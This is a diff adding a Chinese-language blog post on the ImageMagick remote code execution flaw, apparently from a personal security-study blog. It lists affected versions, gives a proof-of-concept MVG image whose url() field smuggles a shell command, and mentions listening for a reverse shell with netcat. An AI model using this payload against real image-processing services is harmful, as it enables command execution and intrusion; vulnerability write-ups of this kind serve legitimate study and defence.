@@ -167,6 +167,66 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-ImageMagick远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/09/10/ImageMagick远程代码执行漏洞/" class="article-date">
+  	<time datetime="2018-09-10T11:20:41.000Z" itemprop="datePublished">2018-09-10</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/09/10/ImageMagick远程代码执行漏洞/">
+        ImageMagick远程代码执行漏洞
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>漏洞简述： 产生原因是因为字符过滤不严谨所导致的执行代码. 对于文件名传递给后端的命令过滤不足,导致允许多种文件格式转换过程中远程执行代码。<br>影响版本：</p>
+<pre><code>ImageMagick6.5.7-8 2012-08-17
+ImageMagick6.7.7-10 2014-03-06
+低版本至6.9.3-9 released 2016-04-30 
+</code></pre><p>触发方法：<br>     构造一个.mvg格式的图片（但文件名可以不为.mvg，比如下图中包含payload的文件的文件名为vul.gif，而ImageMagick会根据其内容识别为mvg图片），并在https://后面闭合双引号，写入自己要执行的命令：<br>poc{<br>push graphic-context<br>viewbox 0 0 640 480<br>fill ‘url(https://“|id; “)’<br>pop graphic-context<br>}</p>
+<p>这样，ImageMagick在正常执行图片转换、处理的时候就会触发漏洞。<br>可以反弹shell后在攻击机上监听端口（nc -ll -p 端口号）。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-xxe学习笔记" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
